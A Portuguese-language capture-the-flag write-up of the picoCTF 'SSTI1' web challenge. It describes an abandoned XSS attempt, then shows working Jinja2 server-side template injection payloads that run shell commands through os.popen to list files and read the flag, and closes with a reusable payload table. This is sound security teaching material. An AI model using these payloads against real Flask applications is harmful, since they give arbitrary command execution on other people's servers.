ğŸ§  picoCTF: SSTI1 â€” Web Exploitation Writeup

ğŸ“ Categoria
Web Exploitation

ğŸ¯ Objetivo
Descobrir a flag explorando vulnerabilidades na aplicaÃ§Ã£o web.

---

ğŸ§© Etapas do processo de exploraÃ§Ã£o

1. ğŸ•µï¸ Reconhecimento inicial

- A aplicaÃ§Ã£o web disponibiliza um formulÃ¡rio para o usuÃ¡rio "anunciar" qualquer coisa.
- Ao submeter o formulÃ¡rio, o conteÃºdo Ã© enviado via mÃ©todo POST para a URL `/`.
- A aplicaÃ§Ã£o entÃ£o redireciona para a rota `/announce`, exibindo o conteÃºdo enviado.

ğŸ” HTML analisado:

<form action="/" method="POST">
    What do you want to announce: <input name="content" id="announce">
    <button type="submit"> Ok </button>
</form>

ObservaÃ§Ãµes:
A aplicaÃ§Ã£o permite inserir HTML bÃ¡sico (ex: <h1>olÃ¡</h1>), e inicialmente parecia vulnerÃ¡vel a XSS.

Utilizei o webhook.site, considerando que poderia ser uma vulnerabilidade XSS, forÃ§ando alguns scripts para exploraÃ§Ã£o via <script>, com a intenÃ§Ã£o de capturar um possÃ­vel bot acessando os anÃºncios e expor um cookie de administrador â€” mas nenhum bot foi detectado.
Isso descartou XSS como vetor de ataque neste desafio.

2. ğŸ“Œ Descoberta crucial: indÃ­cio de SSTI
Ao observar o <title> da pÃ¡gina:

html

<title>SSTI1</title>
Ficou evidente que o desafio envolvia SSTI (Server-Side Template Injection).

ğŸ§  O que Ã© SSTI?
Server-Side Template Injection (SSTI) ocorre quando dados do usuÃ¡rio sÃ£o injetados diretamente em um template do lado do servidor sem sanitizaÃ§Ã£o adequada.

SSTI permite que um invasor injete cÃ³digo malicioso em um sistema de template do lado do servidor, fazendo com que o servidor execute esse cÃ³digo.

3. ğŸ§ª Teste de SSTI
âœ… Payload usado:

{{7*7}}

ğŸ’¡ Resultado:
A pÃ¡gina retornou o valor 49, confirmando que a entrada do usuÃ¡rio estava sendo interpretada como template (provavelmente Jinja2 em Flask).

4. ğŸ’£ ExecuÃ§Ã£o remota de comandos (RCE) via SSTI
ApÃ³s confirmaÃ§Ã£o da SSTI, foi tentado executar comandos shell no servidor:

ğŸ’» Payload:

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

ğŸš€ Explicando o cÃ³digo passo a passo:
config
â†’ VariÃ¡vel preexistente no contexto Flask/Jinja2 (flask.config.Config).

.__class__
â†’ Acessa a classe Config.

.__init__
â†’ Construtor da classe.

.__globals__
â†’ Acessa variÃ¡veis globais do arquivo Python, incluindo mÃ³dulos importados como os.

['os']
â†’ MÃ³dulo os.

.popen('ls')
â†’ Executa o comando ls.

.read()
â†’ LÃª o output do comando.

ğŸ’£ Resultado prÃ¡tico:

__pycache__  app.py  flag  requirements.txt

Comando shell executado com sucesso. A presenÃ§a de flag ou flag.txt confirma o alvo!

5. ğŸ Leitura da flag
Com o arquivo identificado, foi utilizado o payload:

{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}

ou

{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}

âœ… Resultado:
A flag foi retornada diretamente no corpo da resposta! ğŸ†

âœ… ConclusÃ£o
A aplicaÃ§Ã£o estava vulnerÃ¡vel a SSTI.

Foi possÃ­vel escalar a injeÃ§Ã£o atÃ© execuÃ§Ã£o remota de comandos (RCE).

A flag foi extraÃ­da com sucesso utilizando comandos shell via os.popen.

ğŸ” ReferÃªncia de Payloads Ãºteis para Jinja2 SSTI

Objetivo	                            Payload
Teste SSTI	                            {{7*7}}
Listar arquivos        	                {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
Ler conteÃºdo de arquivo	                {{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
Executar comandos arbitrÃ¡rios	        Substituir 'cat flag' por qualquer outro comando shell vÃ¡lido
